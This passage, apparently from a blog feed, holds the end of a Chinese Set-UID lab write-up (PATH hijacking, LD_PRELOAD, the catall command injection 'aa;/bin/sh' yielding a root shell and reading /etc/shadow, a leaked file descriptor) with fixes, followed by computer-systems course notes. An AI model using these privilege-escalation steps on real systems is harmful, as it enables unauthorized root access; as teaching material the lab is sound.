/bin/sh</code>将/bin/sh指向一个特别的shell的程序即可</p><p>再次执行，我们发现程序成功创建了一个具有root权限的shell程序。</p><p><strong>实验原理</strong>是system会调用/bin/sh来执行命令，而shell会在PATH中搜索要使用的命令，所以当我们把我们的恶意程序放在当前目录，并且把当前目录加到环境变量PATH中时，当执行task6就会调用我们的恶意代码，从而成功创建一个shell进程，又因为task6是一个具有root权限的特权程序，所以我们创建的是一个具有root权限的shell进程。</p><h2 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h2><h3 id="Step-1-3"><a href="#Step-1-3" class="headerlink" title="Step 1"></a>Step 1</h3><p>mylib.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sleep</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/*If this is invoked by a privileged program,</span><br><span class="hljs-comment">you can do damages here!*/</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am not sleeping!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>按照题目要求编译但不链接mylib.c</p><p>创建一个新的共享库，并将该共享库加入LD_PRELOAD环境变量。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022170152068.png" alt="image-20211022170152068"></p><p>myprog.c</p><p>编译该文件，保存可执行文件为myprog</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*myprog.c*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-3"><a href="#Step-2-3" class="headerlink" title="Step 2"></a>Step 2</h3><ul><li><p>正常运行myprog</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022172148790.png" alt="image-20211022172148790"></p><p>程序行为被改变，调用了mylib.c 的sleep程序</p></li><li><p>将myprog设置为具有root权限的set-UID程序后再次执行</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022172502079.png" alt="image-20211022172502079"></p><p>程序行为正常，正常调用了lib中的sleep语句 ，睡眠了1s后返回。</p></li><li><p>在root权限下再次export LD_LIBRARY变量，然后再次执行</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022182847388.png" alt="image-20211022182847388"></p><p>发现程序行为再次被改变，调用了mylib.c 的sleep程序</p></li><li><p>要求在另一个用户下运行seed用户的set-UID程序，并重新export LD_LIBRARY变量</p><p>首先利用<code>sudo su</code> 进入root用户</p><p>然后用<code>sudo adduser seed2</code> 创建一个新的用户seed2</p><p>然后<code>su seed2</code>切换到 seed2</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022185658486.png" alt="image-20211022185658486"></p><p>运行root权限的set-UID程序，程序正常执行lib库的sleep函数，睡眠1s</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022190037146.png" alt="image-20211022190037146"></p><p>返回seed用户，将程序改为seed用户的特权程序，然后重新重新export LD_LIBRARY变量</p><p>运行，程序依旧正常执行lib库的sleep函数，睡眠1s</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022190532236.png" alt="image-20211022190532236"></p></li></ul><h3 id="Step-3-3"><a href="#Step-3-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>Linux动态链接器会在一些默认目录中寻找程序所使用的库，用户可以在LD_PRELOAD和LD_LIBRARY_PATH环境变量来增加新的搜索目录和库文件</p><p>我们设置了LD_PRELOAD后可以让链接器将sleep()函数和我们的代码mylib.c连接起来，而不是和标准库libc库中的sleep()函数链接起来。</p><p>所以这导致第一种情况下正常运行myprog程序行为的改变</p><p>而在第二种情况下，我们将程序改为root权限的特权程序后正常执行，这是因为动态链接库的一些防御措施，当进程的真实用户ID和有效用户ID不一样，进程将忽略LD_PRELOAD环境变量。</p><p>在第三种情况下，我们将用户改为root, 然后在运行具有root权限的特权程序后，程序再次改变了行为，调用了mylib.c代码，这是因为真实用户ID和有效用户ID一样，导致防御措施失效了</p><p>在第四种情况下，我们将用户改为seed2，挺好运行然后在运行具有seed用户的特权程序，程序依旧正常执行，防御措施有效。</p><p><strong>实验验证</strong></p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022192624573.png" alt="image-20211022192624573"></p><p>我们复制eve到 当前目录为myenv，然后将其设置为root权限的特权程序，之后设置三个LD变量，用env打印，可以发现三个变量都出现了，用myenv打印发现只出现了一个变量LD_MYOWN</p><p>这就是因为那两个变量对动态链接器的行为会产生影响，所以他们在Set-UID程序中被屏蔽了，从而不会再对特权程序的动态链接产生任何影响，而LD_MYOWN是自己定义的，不会被动态链接器使用，所以没有安全威胁，因此没有被屏蔽。</p><h2 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h2><h3 id="Step-1-4"><a href="#Step-1-4" class="headerlink" title="Step 1"></a>Step 1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * v[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">char</span> * command;<br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please type a filename.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] =<span class="hljs-string">&quot;/bin/cat&quot;</span>; v[<span class="hljs-number">1</span>] = argv[<span class="hljs-number">1</span>]; v[<span class="hljs-number">2</span>] = <span class="hljs-literal">NULL</span>;<br>    command = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">0</span>]) + <span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">1</span>]) + <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">sprintf</span>(command,<span class="hljs-string">&quot;%s%s&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//Useonlyoneofthefollowings.</span><br>    <span class="hljs-built_in">system</span>(command);<br>    <span class="hljs-comment">//execve(v[0],v,NULL);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译catall文件，然后将其设置为root权限的特权程序</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022195314688.png" alt="image-20211022195314688"></p><p>执行如下图所示的指令，可以发现程序创建了一个shell进程，但最开始我们只得到了一个普通的shell程序，这是由于Ubuntu20.04的一个保护机制导致的，我们采用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>zsh <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p>来使得/bin/sh指向/bin/zsh</p><p>再次调用catall “aa;/bin/sh”，我们发现这次创建了一个具有root权限的shell进程，用cat  /etc/shadow 指令验证，发现成功输出密码，说明我们权限窃取成功。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022195229974.png" alt="image-20211022195229974"></p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022200809708.png" alt="image-20211022200809708"></p><h3 id="Step-2-4"><a href="#Step-2-4" class="headerlink" title="Step 2"></a>Step 2</h3><p>注释掉system()，取消注释execve()</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> * v[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">char</span> * command;<br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please type a filename.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] =<span class="hljs-string">&quot;/bin/cat&quot;</span>; v[<span class="hljs-number">1</span>] = argv[<span class="hljs-number">1</span>]; v[<span class="hljs-number">2</span>] = <span class="hljs-literal">NULL</span>;<br>    command = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">0</span>]) + <span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">1</span>]) + <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">sprintf</span>(command,<span class="hljs-string">&quot;%s%s&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//Useonlyoneofthefollowings.</span><br>    <span class="hljs-comment">//system(command);</span><br>    <span class="hljs-built_in">execve</span>(v[<span class="hljs-number">0</span>],v,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译修改后的代码保存为safecatall</p><p>依旧将其设置为root权限的特权程序，再次运行<code>safecatall “aa;/bin/sh&quot;</code>我们发现程序没有出现错误</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022201948533.png" alt="image-20211022201948533"></p><p>第一步中我们得到root权限的原因是因为system(command)函数是通过调用”/bin/sh -c command”完成command指令的，换句话说，外部指令不是上述程序直接执行的，而是shell程序首先被执行，然后shell将command作为输入并解析。但是因为shell过于强大，它可以解析用分号隔开的两条命令，所以当我们输入 “aa;/bin/sh”是，分号后面的指令也被解析并执行了，由此我们得到了一个root权限的shell。</p><p>而使用execve()函数则不会如此，因为它会把那整个字符串作为参数，所以不会发生权限泄露的情况。</p><h2 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h2><p>cap_leak.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> fd;<br>  <span class="hljs-keyword">char</span> *v[<span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><br><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><br><span class="hljs-comment">   * Before running this program, you should create</span><br><span class="hljs-comment">   * the file /etc/zzz first. */</span><br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/zzz&quot;</span>, O_RDWR | O_APPEND);        <br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot open /etc/zzz\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// Print out the file descriptor value</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd is %d\n&quot;</span>, fd);<br><br>  <span class="hljs-comment">// Permanently disable the privilege by making the</span><br>  <span class="hljs-comment">// effective uid the same as the real uid</span><br>  <span class="hljs-built_in">setuid</span>(<span class="hljs-built_in">getuid</span>());                                <br><br>  <span class="hljs-comment">// Execute /bin/sh</span><br>  v[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>; v[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">execve</span>(v[<span class="hljs-number">0</span>], v, <span class="hljs-number">0</span>);                             <br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码展示了一个root用户的Set-UID程序。程序运行分为三步。第一步，它打开了一个只有root用户可以修改的文件/etc/zz。在文件被打开后，程序定义了一个文件描述符，通过该文件描述符完成后续对文件的操作。文件描述符是权限的一种形式，任何拥有它的人都可以访问对应的文件。第二步，通过将有效用户ID(roo)变得跟真实用户ID一样，程序降低了自身的权限，实际上相当于放弃了进程的root特权。第三步，程序调用了一个 shell 程序</p><p>然而上述程序忘记了关闭文件，文件描述符仍然有效，因此这个非特权进程仍然可以修改/etc/zzz文件。从程序的执行结果来看，可以发现文件描述符的值是3.通过echo&gt;&amp;3”命令可以修改/etc/zz文件。这里“&amp;3”表示文件描述符3. 在运行这个 SET-UID程序之前，无法修改受保护的/ete/zz文件。但是通过 SET-UID程序获得文件描述符后，可以成功地修改该文件。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022204515258.png" alt="image-20211022204515258"></p><p>为了修复该程序中的权限泄露问题，应该在降低特权之前先销毁权限，用close(fd)关闭文件描述符即可。</p>]]></content>
    
    
    <categories>
      
      <category>软件安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统笔记</title>
    <link href="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    <url>/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414171144939.png" alt="image-20210414171144939"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414171238561.png" alt="image-20210414171238561"></p><ul><li><p>终端</p><p>.c  -&gt;  .i    (预处理)           gcc -E hello.c -o hello.i    </p><p>.i   -&gt;  .s（汇编语言）     gcc -S hello.o -o hello.s</p><p>.s  -&gt;  .o（机器代码）     gcc -c  hello.o -o hello.o</p><p>查看.o    objdump hello.o  </p><p>变成可执行文件（链接）   gcc hello.o -o hello</p></li></ul><hr><h2 id="第二章-汇编入门"><a href="#第二章-汇编入门" class="headerlink" title="第二章 汇编入门"></a>第二章 汇编入门</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315165706496.png" alt="image-20210315165706496"></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316104330207.png" alt="image-20210316104330207"></p><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315165822191.png" alt="image-20210315165822191"></p><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210316111854447.png" alt="image-20210316111854447"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210316112953982.png"></p><h3 id="gdb-x-命令详解"><a href="#gdb-x-命令详解" class="headerlink" title="gdb x 命令详解"></a>gdb x 命令详解</h3><p>格式：x/&lt;n/f/u&gt; <addr></addr></p><p><strong>n</strong>:</p><p>是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p><p><strong>f</strong>:</p><p>表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</p><p>x 按十六进制格式显示变量。</p><p>d 按十进制格式显示变量。</p><p>u 按十六进制格式显示无符号整型。</p><p>o 按八进制格式显示变量。</p><p>t 按二进制格式显示变量。</p><p>a 按十六进制格式显示变量。</p><p>c 按字符格式显示变量。</p><p>f 按浮点数格式显示变量。</p><p><strong>u</strong>:</p><p>就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes.<br><addr>:表示内存地址。</addr></p><p>整合这个命令的诠释：就是以addr为起始地址，返回n个单元的值，每个单元对应u个字节，输出格式是f。</p><p>如：x/ 3uh 0x54320表示：以地址0x54320为起始地址，返回3个单元的值，每个单元有两个字节，输出格式为无符号十六进制。</p><p>也就是说返回了3*2=6个字节的数据，以十六进制输出，这6个字节的数据，每两个字节为一个单元输出，共输出3个单元。</p><h3 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315190744590.png" alt="image-20210315190744590"></p><p>栈顶是朝着低地址方向生长</p><h3 id="算术逻辑运算指令"><a href="#算术逻辑运算指令" class="headerlink" title="算术逻辑运算指令"></a>算术逻辑运算指令</h3><p>高32位放%edx</p><p>算术右移：填充符号位</p><p>逻辑移位：左边填0</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315190841025.png" alt="image-20210315190841025"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414183735292.png" alt="image-20210414183735292"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414183744478.png" alt="image-20210414183744478"></p><h3 id="条件跳转指令"><a href="#条件跳转指令" class="headerlink" title="条件跳转指令"></a>条件跳转指令</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315195500018.png" alt="image-20210315195500018"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315195530982.png" alt="image-20210315195530982"></p><h3 id="标志位指令"><a href="#标志位指令" class="headerlink" title="标志位指令"></a>标志位指令</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414173258979.png" alt="image-20210414173258979"></p><p>最后一提：计算机对带/无符号数的机器码统一处理<br>O F ， Ｃ Ｆ 等 标 志 位 是 由 机 器 码 运 算 结 果 决 定 的 ， 是 否 为 带 符 号 数 并 不 影 响 </p><p>终极简单的判定方法：</p><p>求OF就把机器码转成带符号数然后运算，看有没有溢出</p><p>求CF同理，转成无符号数，然后运算看有没有溢出</p><h3 id="正溢出-和-负溢出"><a href="#正溢出-和-负溢出" class="headerlink" title="正溢出 和 负溢出"></a>正溢出 和 负溢出</h3><p>如果位数 为w 的两个数x,y;且在系统中为补码表示，<br>如果：      -2^(w-1)&lt;=x+y&lt;2^(w-1) 则结果正常</p><p>x+y&lt;-2^(w-1)^发生负溢出 结果为x+y+2^w^<br>x+y&gt;=2^(w-1)^发生正溢出 结果为x+y-2^w^</p><p>推导过程:<br>对于一个w位，他所能表达值得范围：</p><p>比如 w=4:           0 0 0 0        最大值 0 1 1 1=7  (2^(4-1)-1)<br>最小值 1 0 0 0=-8  (-2^(4-1) )</p><p>超出这个范围将发生溢出，截断溢出位：            </p><p>负溢出+2^w<br>正溢出-2^w<br><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414173419106.png" alt="image-20210414173419106"></p><h3 id="条件码相关知识"><a href="#条件码相关知识" class="headerlink" title="条件码相关知识"></a>条件码相关知识</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210315200213357.png" alt="image-20210315200213357"></p><h2 id="第三章-位字节和信息存储"><a href="#第三章-位字节和信息存储" class="headerlink" title="第三章 位字节和信息存储"></a>第三章 位字节和信息存储</h2><h3 id="信息的位与表示"><a href="#信息的位与表示" class="headerlink" title="信息的位与表示"></a>信息的位与表示</h3><ul><li><strong>典型数据类型的长度</strong></li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414182913863.png"></p><ul><li><p><strong>字节顺序</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414175028953.png" alt="image-20210414175028953"></p></li></ul><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414180814272.png"></p><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><h4 id="IEEE浮点数标准"><a href="#IEEE浮点数标准" class="headerlink" title="IEEE浮点数标准"></a>IEEE<strong>浮点数标准</strong></h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181040336.png" alt="image-20210414181040336"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181054897.png" alt="image-20210414181054897"></p><blockquote><p><strong>规格化值</strong></p></blockquote><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181116849.png" alt="image-20210414181116849"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181322258.png" alt="image-20210414181322258"></p><blockquote><p><strong>非规格化值</strong></p></blockquote><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181242656.png" alt="image-20210414181242656"></p><blockquote><p><strong>特殊值</strong></p></blockquote><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414181430845.png" alt="image-20210414181430845"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210621222546804.png" alt="image-20210621222546804"></p><h4 id="舍入和运算"><a href="#舍入和运算" class="headerlink" title="舍入和运算"></a><strong>舍入和运算</strong></h4><blockquote><p><strong>浮点数舍入规则</strong></p></blockquote><p>如果以形式1.RR..RDD..D表示浮点数（R表示有效位，或保留位，而D表示舍去位），舍入规则就是：</p><p>如果DD..D &lt; 10..0，则向下舍入</p><p>如果DD..D &gt; 10..0，则向上舍入</p><p>如要DD..D = 10..0，则向最近偶数舍入，细则如下 ：</p><p>a. 如果RR..R = XX..0 （最低有效位是0），则向下舍入</p><p>b. 如果RR..R = XX..1（最低有效位是1），则向上舍入</p><blockquote><p><strong>浮点数运算</strong></p></blockquote><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414182405160.png" alt="image-20210414182405160"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414182418619.png" alt="image-20210414182418619"></p><h2 id="第四章-程序的机器级表示"><a href="#第四章-程序的机器级表示" class="headerlink" title="第四章  程序的机器级表示"></a>第四章  程序的机器级表示</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><h4 id="IA32寄存器"><a href="#IA32寄存器" class="headerlink" 